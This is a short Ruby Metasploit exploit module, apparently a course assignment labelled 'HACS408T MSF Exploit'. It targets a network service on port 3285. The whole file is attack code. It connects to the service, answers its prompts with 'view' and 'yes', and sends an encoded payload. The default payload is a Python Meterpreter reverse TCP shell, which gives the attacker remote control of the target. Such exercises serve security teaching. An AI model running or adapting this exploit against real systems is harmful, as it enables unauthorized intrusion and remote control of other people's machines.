require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote 
    include Msf::Exploit::Remote::Tcp 
    def initialize ()
    super( 'Name' =>    'exploit_szupan',
                        'Version'        => '$Revision: 1 $',
                        'Description'    => 'HACS408T MSF Exploit',
                        'Author'         => 'Stephen Zupan',
                        'License'        => MSF_LICENSE,
                        'DefaultOptions' => {
                            'PAYLOAD' => 'python/meterpreter/reverse_tcp'
		            },
                        'DefaultTarget' => 0,
                        'Platform' => ['python'],
                        'Targets' => [['Python', {'Arch' => ARCH_PYTHON, 'Platform' => 'python'}]]
                )
                register_options(
                        [
                                Opt::RPORT(3285)
                        ], self.class)
        end

               def exploit()
                connect()
		greeting = "HELLO SERVER" 
                yes = 'yes'
                view = 'view'
                data = sock.recv(10240)
                print(data)
                sock.puts(view)
                data = sock.recv(10240)
                print(data)
                data = sock.recv(10240)
                print(data)
                sock.puts(yes)
                data = sock.recv(10240)
                print(data)
                sock.put(payload.encoded)
                disconnect()
        end
end
